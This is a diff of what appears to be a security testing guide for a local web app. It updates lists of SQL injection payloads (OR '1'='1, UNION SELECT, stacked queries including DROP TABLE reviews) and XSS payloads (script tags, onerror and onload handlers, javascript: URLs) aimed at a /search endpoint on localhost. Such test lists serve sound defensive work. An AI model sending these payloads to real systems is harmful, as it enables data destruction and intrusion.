@@ -46,24 +46,24 @@ SQL Injection attempts (via GET /search):
 # Basic SQL injection attempts
 http://localhost:3000/search?searchTerm=Black' OR '1'='1
 http://localhost:3000/search?searchTerm=Black' UNION SELECT 'hack','test
-http://localhost:3000/search?searchTerm='; SELECT * FROM reviews; --
+http://localhost:3000/search?searchTerm=%'; SELECT * FROM reviews; --
 
 # More complex attempts
 http://localhost:3000/search?searchTerm=' OR game LIKE '%
-http://localhost:3000/search?searchTerm='; DROP TABLE reviews; --
+http://localhost:3000/search?searchTerm=x%'; DROP TABLE reviews; --
 ```
 
 XSS attempts (try both GET and POST /search):
 
 ```text
 # Basic script injection
-http://localhost:3000/search?searchTerm=<script>alert('xss')</script>
+http://localhost:3000/search?searchTerm=x%';--<script>alert('xss')</script>
 
 # Event handlers
-http://localhost:3000/search?searchTerm=<img src="x" onerror="alert('xss')">
-http://localhost:3000/search?searchTerm=<body onload="alert('xss')">
+http://localhost:3000/search?searchTerm=x%';--<img src="x" onerror="alert('xss')">
+http://localhost:3000/search?searchTerm=x%';--<body onload="alert('xss')">
 
 # More subtle attempts
-http://localhost:3000/search?searchTerm=<div onmouseover="alert('xss')">hover me</div>
-http://localhost:3000/search?searchTerm=javascript:alert('xss')//
+http://localhost:3000/search?searchTerm=x%';--<div onmouseover="alert('xss')">hover me</div>
+http://localhost:3000/search?searchTerm=x%';--javascript:alert('xss')//
 ```
